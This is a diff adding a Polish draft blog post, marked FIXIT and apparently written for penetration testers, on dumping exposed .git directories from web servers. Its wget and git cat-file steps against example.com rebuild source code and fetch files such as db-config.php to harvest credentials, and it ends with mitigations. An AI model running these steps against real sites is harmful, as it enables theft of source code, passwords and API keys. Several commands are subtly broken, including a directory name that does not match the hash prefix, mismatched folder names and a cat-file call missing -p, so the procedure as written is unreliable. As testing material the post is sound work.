@@ -1,0 +1,124 @@
+W trakcie przeprowadzanych przez nas testw penetracyjnych aplikacji webowych czasem zdarzy sie nam natrafic na katalog .git z wlaczonym lub wlayczonym listowaniem plikow. 
+
+Developerzy czsto zapominaja/nie sa swiadomi ze podczas uzywania komendu 'git clone' automatycznie tworzony jest katalog .git zawierajacy metadane repozytorium.
+Zadrza się również że repozytorium zawiera pliki konfiguracyjne z loginami/sasłami które powinny znaleźć się w pliku gitignore.  ---FIXIT
+
+Jakie korzyści daje nam dostęp do folderu .git?
+
+Jezeli plrzykładowa aplikacja nie jest open sourcowa możemy przeprowadzić analizę kodu do kotórego normalnie nie mielibyśmy dostępu.
+W plikach konfiguracyjnych możemy znaleźć np. poświadczenia potrzebne do połączenia się z bazą danych. AUTH API Keye itp
+
+Z perspektywy osoby przeprowadzającej testy jest to bezcenne znalezisko, jak zatem odczytać zawartość repozytorium?
+
+W przypadku gdy włączone jest listowanie plików sprawa jest prosta.
+
+Tworzymy folder do którego pobierzemy całą zawartosć katalogu .git
+
+mkdir gitdump
+
+Przechodzimy do folderu
+
+cd gitdump
+
+Pobieramy zawartość katalogu wraz z podfolderami i wszystkimi plikami.
+
+wget --mirror --include-directories=/.git http://example.com/.git
+
+Po pobraniu wszystkich plików przechodzimy do folderu 
+
+cd example.com
+
+i wykonujemy polecenie 
+
+git reset --hard
+
+Jeżeli wszystko przebiegło bez problemów zobaczymy komunikat
+
+HEAD is now at [...]
+
+Po wylistowaniu zawartości folderu naszym oczom powinny sie ukazać pliki z kodem źródłowym aplikacji.
+
+Trudniejszy, ale nie niemożliwy jest podgląd plików w przypadku gdy na serwerze wyłączone jest listowanie plików.
+
+W takim przypadku po wejściu pod przykładowy adres example.com/.git nie zobaczymy żadnych podfolderów. W zależności od konfiguracji serwera www naszym oczom ukaże się blank page lub komunikat podobny to tego poniżej
+
+Directory listing not allowed
+Forbidden
+
+W takim przypadku warto spawdzić czy mamy dostęp do pliku example.com/.git/logs/HEAD
+Jeżeli tak naszym oczom ukaże się zawartość pliku:
+
+0000000000000000000000000000000000000000 7fe18903e7977db3a373981fb775884c9189fab9  ...
+
+
+Zawartośc plików odczytujemy w opisany poniżej sposób -- FIXIT
+
+Tworzymy przykładowy folder
+
+mkdir gitexaple && cd gitexample
+
+Inicjalizujemy nowe repozytorium
+
+git init
+
+Przechodzimy do folderu ./git/objects/
+
+Tworzymy folder z nazwą zawierającą dwie pierwsze listery z ciągu zawartego w pliku .git/logs/HEAD
+W naszym przypadku będzie to:
+
+mkdir 7e && cd 7e
+
+W folderze ./git/objects/ na serwerze www znajduje sie katalog odpowiadający dwóm pierwszym literom ciągu z pliku .git/logs/HEAD a w nim plik którego nazwa to pozostałe znaki z tego ciągu 
+Pobieramy go
+
+wget http://example.com/.git/objects/7f/e18903e7977db3a373981fb775884c9189fab9 
+
+a następnie czytamy jego zawartość
+
+git cat-file -p 7fe18903e7977db3a373981fb775884c9189fab9 
+
+po wywołaniu komendy zobaczymy kilka lini tekstu, interesuje nas ciag znaków po słowie tree
+
+...
+tree e8189a98db67ce982248c72b56e5ba2102921bff
+parent b7fe7438096875631fa6f917dc4a6896cbb9bf02
+...
+
+analogicznie do poprzednio wykonanych kroków w katalogu .git/objects/ tworzymy folder nazwany na podstawie dwoch pierwszych znaków z ciągu e8189a98db67ce982248c72b56e5ba2102921bff i pobieramy z niego plik nazwany resztą znaków z tego ciągu.
+
+mkdir e8 && cd e8
+wget http://example.com/.git/objects/e8/189a98db67ce982248c72b56e5ba2102921bff
+
+i odczytujemy zawartosć pobranego pliku 
+
+git cat-file -p e8189a98db67ce982248c72b56e5ba2102921bff
+
+W tym momencie powinna ukazać sie nam lista plików zawartych w repozytorium oraz ciągi znaków potrzebne do ich odczytania, przykładowo:
+
+040000 tree <--- folder  7b557a72a79b3a38512139bac573e36b44c89181    cms
+040000 tree d36e87fd76488f48acc41a6a585625a569db5f88    includes   
+040000 tree b97734c693e55982a6f2285f28e315e7af60d272    images
+100644 blob <--- plik  42fd8b71db9d1f2df671601a6b90c613a1cb6c40    db-config.php
+100644 blob e63a64345d5d230a247876fe5f0fcf0f31bb2345    composer.json
+040000 tree fbd1d628c2562ae14cf343e0b41cf190c05bedc8    library
+
+Zakładając że chcemy odczytać zawartośc pliku db-config.php ponownie w .git/object tworzymy katalog 42 i pobieramy plik fd8b71db9d1f2df671601a6b90c613a1cb6c40
+
+mkdir 42 && cd 42
+wget http://example.com/.git/objects/42/fd8b71db9d1f2df671601a6b90c613a1cb6c40
+
+i oczytujemy jego zawartość 
+
+git cat-file 42fd8b71db9d1f2df671601a6b90c613a1cb6c40
+
+Całość procesu można zautomatyzować w dość prosty sposób.
+
+Co robic aby nie spotkało to także nas? Oto kilka pomysłów:
+
+Usunięcie folderu .git po check-oucie
+Skorzystanie z .htaccess w celu zablokowania dostepu do foldeu .git
+Trzymanie folderu .git jeden poziom wyżej, w miejscu niedostepnym dla serwera www
+
+
+
+
